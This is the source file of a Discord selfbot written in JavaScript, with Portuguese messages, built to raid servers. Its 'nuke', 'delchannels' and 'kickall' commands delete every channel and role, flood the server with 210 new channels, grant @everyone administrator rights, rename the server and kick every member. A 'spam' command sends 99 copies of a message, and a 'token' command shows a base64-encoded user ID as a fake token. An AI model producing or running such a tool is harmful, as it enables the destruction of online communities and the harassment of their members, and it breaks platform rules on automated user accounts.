const Discord = require('discord.js-selfbot');
const client = new Discord.Client();
const chalk = require('chalk');
const cfonts = require('cfonts');
const MessageEmbed = require('discord.js').MessageEmbed;
const config = require("./config.json");

const prefix = `${config.prefix}`;

    const banner = cfonts.render((`Nity`), {
        font: 'block',
        color: 'candy',
        align: 'left',
        gradient: ["red","magenta"],
        lineHeight: 3
    });    

client.on('ready', () => {
    console.log(chalk.yellow(`
${banner.string}

Logado em: ${client.user.tag}
ID: ${client.user.id}
Servers: ${client.guilds.cache.size}
Usuarios ${client.users.cache.size}

Comandos:

${config.prefix}nuke - Raidar o Servidor.

${config.prefix}delchannels - Apagar todos Canais do Servidor.

${config.prefix}stream - Colocar status de Live.

${config.prefix}play - Colocar status de Jogo.
${config.prefix}spam (e sua msg) - spama a mensagem que você colocou.`));
});



client.on("message", function(message) {
  if (message.author.id !== client.user.id) return;
  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;

  const commandBody = message.content.slice(prefix.length);
  const args = commandBody.split(' ');
  const command = args.shift().toLowerCase();
   if(command === "nuke")
  {
    message.delete();
    message.guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
    message.guild.channels.cache.forEach
    (channel => channel.delete());
    for (pas = 0; pas < 210; pas++)
    message.guild.channels.create
    (`${config.channel}`, {
      type: 'text'
    });
    console.log(`Excluiu tudo`);
    message.guild.setName(`${config.server}`);
    console.log(`Mudou o nome do Servidor`);
  }
  
  else if(command === "spam") 
  {
    message.delete();
    for (pas = 0; pas < 99; pas++) {
      
      let msg = args.join(' ');
      
      message.channel.send(msg
      );
    }
  }
  
  else if(command === "kickall")
  {
    message.guild.members.cache.forEach(member => member.kick({ reason: "Nuked" })
                    .then(console.log(`${member.user.tag} | Kickado`) && message.channel.send("Kickando Geral.")
                        .catch()
                    ));
                message.delete();
  }
  
  else if(command === "nuke") {
    message.guild.roles.everyone.setPermissions(['CONNECT']);
        if(message.guild.channels.cache) {

            message.guild.channels.cache.forEach(channel => channel.delete());

        }

        if(message.guild.roles.cache) {

            message.guild.roles.cache.forEach(role => role.delete());

        }
  }

else if(command === "delchannels") {
    message.guild.roles.everyone.setPermissions(['CONNECT']);
        if(message.guild.channels.cache) {

            message.guild.channels.cache.forEach(channel => channel.delete());

        }

        if(message.guild.roles.cache) {

            message.guild.roles.cache.forEach(role => role.delete());

        }
  }
    
  else if(command === "stream") {
    message.delete();
    let msg = args.join(' ');
    client.user.setActivity(msg, {type: 'STREAMING' });
    console.log("Vc Ativou modo Stream:" + msg);
  }
  
else if(command === "play") {
    message.delete();
    let msg = args.join(' ');
    client.user.setActivity(msg, {type: 'PLAYING' });
    console.log("Vc Ativou modo Play:" + msg);
  }
  
  
  else if(command === "token") {
    message.delete();
    let user = message.mentions.users.first() || client.users.cache.get(args[0]);
if(!user) return message.channel.send('Voce Presisa Mencionar um Usuario');    
    let embed = new Discord.MessageEmbed()
    .setDescription(Buffer.from(user.id).toString("base64"))
    .setColor("#01060d")
    .setFooter('Caralho Bela Token Amigo!');
    message.channel.send(embed);
  }
});
  
client.on("message", message => {
  if (message.author.bot) return;
  if (message.channel.type == 'mencao')
  return
  if(message.content == `<@${client.user.id}>` || message.content == `<@!${client.user.id}>`) {
  return message.channel.send(`${message.author} Marca n Corno to Ocupado`)
  }
});

client.login(process.env.token).catch(() => { console.log(`[x] Token Inválida.`) });